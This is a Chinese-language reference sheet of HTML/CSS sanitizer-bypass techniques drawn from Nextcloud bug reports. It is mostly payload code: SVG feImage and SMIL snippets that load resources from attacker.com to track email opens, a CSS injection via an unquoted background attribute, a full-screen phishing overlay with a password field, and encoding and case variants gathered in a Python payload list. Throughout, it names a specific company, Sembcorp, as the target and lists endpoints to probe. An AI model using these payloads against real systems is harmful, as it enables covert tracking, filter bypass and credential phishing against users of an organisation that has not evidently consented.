# HTML/CSS 过滤器绕过参考

> 来源：Nextcloud HackerOne 漏洞报告 (nullcathedral)  
> 适用场景：测试富文本编辑器、邮件客户端、用户输入过滤系统

---

## 漏洞类型总览

### 1. SVG feImage 过滤器绕过
**原理**：`<feImage>` SVG 过滤器原语可以加载外部资源，HTML sanitizer 未正确过滤

**测试 Payload**：
```html
<svg>
  <filter id="f1">
    <feImage href="http://attacker.com/track.php"/>
  </filter>
  <rect filter="url(#f1)" width="100" height="100"/>
</svg>
```

**影响**：
- 绕过"阻止远程图片"功能
- 可以追踪邮件打开（获取 IP、时间戳）
- 隐私泄露

**测试目标**：
- ✅ 邮件系统（如 Sembcorp 的企业邮箱）
- ✅ 富文本编辑器
- ✅ 用户头像上传（如果支持 SVG）

---

### 2. CSS `position: fixed !important` 绕过
**原理**：CSS sanitization 未处理 `!important` 声明，攻击者可以覆盖固定位置限制

**测试 Payload**：
```html
<div style="position:fixed !important; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999;">
  <div style="background:white; padding:20px; text-align:center; margin-top:200px;">
    <h1>钓鱼页面</h1>
    <input type="password" placeholder="输入密码"/>
  </div>
</div>
```

**影响**：
- 创建全屏钓鱼覆盖层
- 欺骗用户输入敏感信息
- 绕过 UI 安全限制

**测试目标**：
- ✅ 论坛/评论系统
- ✅ 用户资料编辑
- ✅ 富文本消息

---

### 3. 未引号的 `background` 属性 CSS 注入
**原理**：HTML sanitizer 未引号 `background` 属性值，`data:` URI 可以终止 `url()` 函数

**测试 Payload**：
```html
<body background=data:text/css,}@keyframes{from{background:url(http://attacker.com/exploit.css}}
```

**技术细节**：
- `data:text/css,` 创建 CSS 数据 URI
- `}` 终止 `url()` 函数
- 注入任意 CSS 属性
- 加载外部 CSS 文件

**影响**：
- CSS 注入
- 加载外部资源
- 绕过远程图片阻止

**测试目标**：
- ✅ 邮件 HTML 编辑器
- ✅ 允许自定义样式的表单
- ✅ 模板系统

---

### 4. SMIL 动画属性绕过
**原理**：SVG SMIL 动画的 `values` 和 `by` 属性未验证，可以加载外部资源

**测试 Payload**：
```html
<svg>
  <a>
    <animate attributeName="href" values="http://attacker.com/track"/>
    <text>点击我</text>
  </a>
</svg>
```

**其他变体**：
```html
<svg>
  <animate attributeName="href" to="http://attacker.com/exploit.svg" begin="0s"/>
  <image href=""/>
</svg>
```

**影响**：
- 通过动画加载外部资源
- 绕过内容安全策略
- 邮件追踪

**测试目标**：
- ✅ 支持 SVG 的任何系统
- ✅ 邮件客户端
- ✅ 富文本编辑器

---

## 通用测试方法

### 步骤 1：识别过滤点
```python
# 测试 Sembcorp 哪些地方接受 HTML 输入
test_vectors = [
    '/profile/edit',           # 用户资料
    '/forum/post',             # 论坛发帖
    '/email/compose',          # 邮件编辑
    '/comment/add',            # 评论系统
    '/upload/avatar',          # 头像上传（SVG）
]
```

### 步骤 2：测试 SVG 支持
```html
<!-- 测试 1：基本 SVG -->
<svg width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>

<!-- 测试 2：SVG 动画 -->
<svg>
  <animate attributeName="opacity" values="0;1;0" dur="2s" repeatCount="indefinite"/>
  <rect width="100" height="100" fill="blue"/>
</svg>

<!-- 测试 3：feImage 过滤器 -->
<svg>
  <filter id="test">
    <feImage href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>"/>
  </filter>
</svg>
```

### 步骤 3：测试 CSS 注入
```html
<!-- 测试 1：!important 覆盖 -->
<div style="position:fixed !important; top:0;">
  固定位置内容
</div>

<!-- 测试 2：background 属性 -->
<body background="data:text/css,body{background:url(http://attacker.com/)}">

<!-- 测试 3：CSS 函数注入 -->
<div style="background:url('javascript:alert(1)')">
```

### 步骤 4：分析响应
```python
# 检查过滤器是否移除了危险元素
dangerous_patterns = [
    'feImage',
    'animate',
    '!important',
    'data:text/css',
    'position:fixed',
]

for pattern in dangerous_patterns:
    if pattern in response.text.lower():
        print(f"[!] 过滤器未移除: {pattern}")
```

---

## 高级绕过技术

### 1. 编码绕过
```html
<!-- URL 编码 -->
<svg><filter><feImage href="http://attacker.com/"/></filter></svg>

<!-- HTML 实体编码 -->
&#x3C;svg&#x3E;&#x3C;animate attributeName="href" to="http://attacker.com/"/&#x3E;

<!-- Base64 编码 -->
<svg><image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4="/></svg>
```

### 2. 大小写变换
```html
<SVG><FILTER><FEIMAGE href="http://attacker.com/"/></FILTER></SVG>
<svg><Animate attributeName="href" to="http://attacker.com/"/></svg>
```

### 3. 空格/换行混淆
```html
<svg>
  <filter id="test">
    <feImage
      href="http://attacker.com/track"
    />
  </filter>
</svg>
```

### 4. 命名空间绕过
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="href" to="http://attacker.com/"/>
</svg>

<math xmlns="http://www.w3.org/1998/Math/MathML">
  <!-- MathML 也可能被忽略 -->
</math>
```

---

## 在 Sembcorp 测试中的应用

### 优先级高的测试点

1. **企业邮箱系统**（如果有）
   - 邮件 HTML 编辑器
   - 邮件签名自定义
   - 附件预览

2. **内部论坛/知识库**
   - 文章编辑器
   - 评论系统
   - 用户资料

3. **文件上传功能**
   - SVG 文件上传
   - 文档预览
   - 图片处理

4. **表单系统**
   - 富文本字段
   - 模板自定义
   - 报表生成

### 测试 Payload 集合

```python
HTML_CSS_BYPASS_PAYLOADS = [
    # SVG feImage
    '<svg><filter><feImage href="http://attacker.com/"/></filter></svg>',
    
    # CSS !important
    '<div style="position:fixed !important; top:0; left:0; width:100%; height:100%;">',
    
    # Background 属性注入
    '<body background=data:text/css,}@keyframes{from{background:url(http://attacker.com/}}',
    
    # SMIL 动画
    '<svg><animate attributeName="href" to="http://attacker.com/"/></svg>',
    
    # 编码变体
    '&#x3C;svg&#x3E;&#x3C;feImage href="http://attacker.com/"/&#x3E;',
    
    # 大小写
    '<SVG><FILTER><FEIMAGE href="http://attacker.com/"/></FILTER></SVG>',
]
```

---

## 防御建议（了解防御以更好绕过）

### 常见防御机制

1. **HTML Sanitizer**
   - 白名单标签/属性
   - 移除事件处理器
   - 过滤危险协议（javascript:, data:）

2. **CSS Sanitizer**
   - 移除 `position: fixed`
   - 过滤 `!important`
   - 限制 `url()` 协议

3. **SVG 过滤**
   - 移除 `<animate>` 等动态元素
   - 过滤 `<feImage>` 等外部资源加载
   - 移除事件处理器（onload, onclick）

### 常见绕过点

- Sanitizer 未处理 SVG 命名空间
- 未过滤 `!important` 声明
- 未引号属性值
- 未处理 SMIL 动画
- 白名单过于宽松

---

## 参考资源

- [Nextcloud HackerOne 报告](https://hackerone.com/nextcloud)
- [SVG feImage 规范](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/feImage)
- [SMIL 动画规范](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animate)
- [CSS Sanitization 最佳实践](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

**更新日期**: 2026-05-21  
**适用场景**: 富文本编辑器、邮件客户端、用户输入过滤系统
